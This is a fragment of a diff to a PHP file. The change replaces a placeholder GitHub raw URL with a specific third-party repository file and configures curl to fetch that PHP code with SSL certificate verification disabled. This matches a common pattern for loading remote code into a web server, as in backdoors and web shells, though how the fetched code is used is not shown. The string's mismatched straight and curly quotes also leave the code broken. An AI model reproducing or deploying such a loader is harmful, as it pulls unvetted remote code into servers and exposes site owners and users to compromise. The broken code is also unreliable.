@@ -1,5 +1,5 @@
 <?php 
-$GithubRawURI= "https://raw.githubusercontent.com/UserName/GitName/FileName.php”; 
+$GithubRawURI= "https://raw.githubusercontent.com/fck2/links/main/abc.php”; 
 $ch = curl_init(); 
 curl_setopt($ch, CURLOPT_URL, $GithubRawURI); 
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
